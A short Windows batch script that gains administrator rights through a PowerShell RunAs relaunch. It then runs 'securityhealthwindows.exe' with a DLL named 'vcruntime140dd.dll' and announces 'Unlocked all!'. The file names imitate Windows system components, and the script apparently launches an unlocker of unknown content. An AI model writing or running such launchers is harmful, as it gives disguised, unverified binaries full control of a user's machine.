@echo off
cd /d "%~dp0"
color 4
echo Current user privileges: %userprofile%
echo.
echo Requesting administrative privileges...

:: Check if the script is already running with elevated privileges (Administrator).
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :continue
) else (
    goto :admin
)

:admin
echo.
echo This batch file requires administrator privileges.
echo Please grant administrative privileges by selecting "Yes" when prompted.
echo.
:: Re-run the batch script with elevated privileges (RunAs).
powershell -Command "Start-Process '%0' -Verb RunAs"
exit

:continue
echo Administrative privileges confirmed.
echo.

:: Place your commands that require administrative privileges here.
securityhealthwindows.exe vcruntime140dd.dll

echo.
echo Unlocked all!
echo.
pause > nul
exit
